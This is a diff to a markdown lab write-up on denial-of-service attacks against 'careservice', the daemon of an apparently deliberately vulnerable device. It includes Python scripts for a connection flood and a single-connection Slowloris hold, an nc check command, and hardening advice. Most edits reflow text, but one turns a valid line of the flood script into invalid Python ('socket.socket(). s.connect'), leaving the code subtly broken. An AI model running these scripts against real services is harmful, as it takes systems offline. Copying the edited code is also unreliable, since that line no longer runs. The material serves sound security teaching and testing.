@@ -64,10 +64,7 @@ ssize_t got  = recv(c_fd, &hdr, sizeof(hdr), 0);   /* :223 — blocks forever if
 ssize_t pgot = recv(c_fd, payload, p_len, 0);      /* :250 — blocks forever until p_len bytes arrive  */
 ```
 
-A client that connects and then withholds the bytes the server is waiting for blocks
-`handle_request()` **indefinitely**. Combined with the serial accept loop (point 2),
-**one** such connection never returns to `accept()` and freezes the entire daemon —
-the enabler for the single-connection collapse (Technique B below).
+A client that connects and then withholds the bytes the server is waiting for blocks `handle_request()` **indefinitely**. Combined with the serial accept loop (point 2), **one** such connection never returns to `accept()` and freezes the entire daemon — the enabler for the single-connection collapse (Technique B below).
 
 ---
 
@@ -85,12 +82,7 @@ the enabler for the single-connection collapse (Technique B below).
 
 > **Correction:** `careservice` closes the socket after **one** command, so an exploit that reuses a single socket for many commands does **not** work — only the first is processed. The real attack is **one connection per command**, and since `0x07` is unauthenticated, no `0x02` auth step is needed.
 
-> **Obtaining the MAGIC `CARE`:** the attacker needs no source access or packet
-> sniffing — a logged-in patient can leak it through the **API5 Broken Function Level Authorization** threshold
-> endpoint, whose `igp_request` field exposes the raw frame (first 4 bytes =
-> `0x43415245`). See [API5_Broken_Function_Level_Authorization.md](API5_Broken_Function_Level_Authorization.md) → "Chain: leak the IGP MAGIC".
-> (For Technique B's *valid*-`0x07` hold the magic is required; the zero-byte hold
-> and the churn flood do not even need it.)
+> **Obtaining the MAGIC `CARE`:** the attacker needs no source access or packet sniffing — a logged-in patient can leak it through the **API5 Broken Function Level Authorization** threshold endpoint, whose `igp_request` field exposes the raw frame (first 4 bytes = `0x43415245`). See [API5_Broken_Function_Level_Authorization.md](API5_Broken_Function_Level_Authorization.md) → "Chain: leak the IGP MAGIC". (For Technique B's *valid*-`0x07` hold the magic is required. The zero-byte hold and the churn flood do not even need it.)
 
 There are **two techniques**, with very different impact.
 
@@ -103,7 +95,7 @@ TARGET, MAGIC = ("192.168.2.1", 9999), 0x43415245   # "CARE"
 
 def flood():
     while True:
-        s = socket.socket(); s.connect(TARGET)
+        s = socket.socket(). s.connect(TARGET)
         s.send(struct.pack(">IBBH", MAGIC, 0x07, 0, 0))   # one cmd, no auth
         try: s.recv(1024)
         except OSError: pass
@@ -114,20 +106,11 @@ for _ in range(20):                                  # 20 concurrent floods
 import time; time.sleep(60)
 ```
 
-This is the naive approach and it **does not bring the service down**. Each `0x07`
-is serviced in well under a millisecond and the serial loop drains the backlog fast,
-so a legitimate command merely queues behind it — measured impact is **added latency
-(~1.6 s observed), not denial**. It is kept here only as the contrast that motivates
-Technique B.
+This is the naive approach and it **does not bring the service down**. Each `0x07` is serviced in well under a millisecond and the serial loop drains the backlog fast, so a legitimate command merely queues behind it — measured impact is **added latency (~1.6 s observed), not denial**. It is kept here only as the contrast that motivates Technique B.
 
 ### Technique B — partial-frame hold / Slowloris (total collapse, ONE connection)
 
-The effective attack does not rely on volume at all. Because the accepted socket has
-**no read timeout** (see Root Cause #5), a connection that sends a *partial frame* and
-then withholds the rest blocks `handle_request()` forever; the single-threaded serial
-loop never returns to `accept()`, so the whole command channel is wedged. **One**
-connection is sufficient; a small pool also fills the backlog (5) so new connects are
-outright refused.
+The effective attack does not rely on volume at all. Because the accepted socket has **no read timeout** (see Root Cause #5), a connection that sends a *partial frame* and then withholds the rest blocks `handle_request()` forever. The single-threaded serial loop never returns to `accept()`, so the whole command channel is wedged. **One** connection is sufficient. A small pool also fills the backlog (5) so new connects are outright refused.
 
 ```python
 #!/usr/bin/env python3
@@ -165,16 +148,14 @@ print(f"[+] {len(held)} connections held — careservice serial loop is wedged."
 print("[+] Sending nothing more: the freeze IS the absence of further bytes.")
 try:
     while True:
-        time.sleep(3600)      # keep the sockets open; ANY byte sent would release a recv()
+        time.sleep(3600)      # keep the sockets open. ANY byte sent would release a recv()
 except KeyboardInterrupt:
     for s in held: s.close()
 ```
 
 
 
-Verify **from a different host** with a public, no-auth command that has **no `:8081`
-downstream** (`0x01 SYS_INFO`), so the hang is unambiguous and isolated from sensor
-state:
+Verify **from a different host** with a public, no-auth command that has **no `:8081` downstream** (`0x01 SYS_INFO`), so the hang is unambiguous and isolated from sensor state:
 
 ![[ip4_dos_check.png]]
 
@@ -183,11 +164,7 @@ printf 'CARE\x01\x00\x00\x00' | nc -w 8 192.168.2.1 9999   # 0x01 SYS_INFO: hang
 curl -s -m 5 http://<cloud>:5002/api/device/status         # cloud proxy times out / 503
 ```
 
-> **Measured (host build of `careservice.c`):** baseline `0x01 SYS_INFO` returns in
-> **0.1 ms**; with **one** withheld-payload connection held, `0x01` **times out at
-> 5000 ms** (wedged); the instant the attacker disconnects it returns to **0.2 ms**.
-> `procd` does **not** rescue the daemon — it is blocked in `recv()` (alive, not
-> crashed), so it is never respawned; the outage lasts exactly as long as the hold.
+> **Measured (host build of `careservice.c`):** baseline `0x01 SYS_INFO` returns in **0.1 ms**. With **one** withheld-payload connection held, `0x01` **times out at 5000 ms** (wedged). The instant the attacker disconnects it returns to **0.2 ms**. `procd` does **not** rescue the daemon — it is blocked in `recv()` (alive, not crashed), so it is never respawned. The outage lasts exactly as long as the hold.
 
 ---
 
@@ -218,7 +195,7 @@ The toggle is the careotter device's first secure/vulnerable switch: the init.d 
 
 ### Further hardening (defense in depth)
 1. **Set a read timeout on the accepted socket** (`SO_RCVTIMEO` on `c_fd`) and/or a whole-request deadline, so a client that withholds bytes is dropped instead of blocking the serial loop. This is the specific control for the Technique B hold — the per-source **rate** limiter does *not* cover it, since one slow connection is under any rate threshold. Pair it with bounded concurrency so a single slow client cannot monopolize the server.
-2. Cap concurrent in-flight connections; use a bounded connection pool / circuit breaker for the `:8081` calls (timeout already present: `SO_RCVTIMEO` 3s).
+2. Cap concurrent in-flight connections. Use a bounded connection pool / circuit breaker for the `:8081` calls (timeout already present: `SO_RCVTIMEO` 3s).
 3. Make `sensor_service` a `ThreadingHTTPServer` with a bounded worker semaphore.
 4. Require authentication for `0x07`, and add audit logging of throttled sources.
 
@@ -231,7 +208,7 @@ The toggle is the careotter device's first secure/vulnerable switch: the init.d 
 | Rate limiting | Per-source-IP token bucket on the command channel | Stop a single source from monopolizing the serial server |
 | Concurrency | Bounded in-flight cap + connection pool to `:8081` | Prevent downstream amplification |
 | Availability | Threaded, bounded `sensor_service` | Absorb concurrent `/vitals` load |
-| Auth | Authenticate `0x07`; log throttled sources | Reduce the unauthenticated attack surface + enable forensics |
+| Auth | Authenticate `0x07`. Log throttled sources | Reduce the unauthenticated attack surface + enable forensics |
 
 ---
 
@@ -240,10 +217,10 @@ The toggle is the careotter device's first secure/vulnerable switch: the init.d 
 - [ ] Vulnerable mode (`CARESERVICE_SECURE` unset/0): a connection flood of `0x07`
       (Technique A) saturates `:9999` and adds latency to a legit `/api/device/status`.
 - [ ] Vulnerable mode: a **single** partial-frame hold (Technique B — withheld payload,
-      or zero bytes after connect) wedges the daemon; a legit `0x01 SYS_INFO` from
+      or zero bytes after connect) wedges the daemon. A legit `0x01 SYS_INFO` from
       another host hangs until the attacker disconnects.
 - [ ] Secure mode (`=1`): the flood source is throttled (`ERR_RATE_LIMITED` after the
-      burst); a legit command from a **different** source IP still succeeds in budget.
+      burst). A legit command from a **different** source IP still succeeds in budget.
 - [ ] Gap: secure mode's per-source **rate** limiter stops Technique A but **not**
       Technique B — one slow connection is under any rate threshold (see *How It Should Be*).
 - [ ] `0x07` confirmed unauthenticated (no `0x02` needed for the flood).
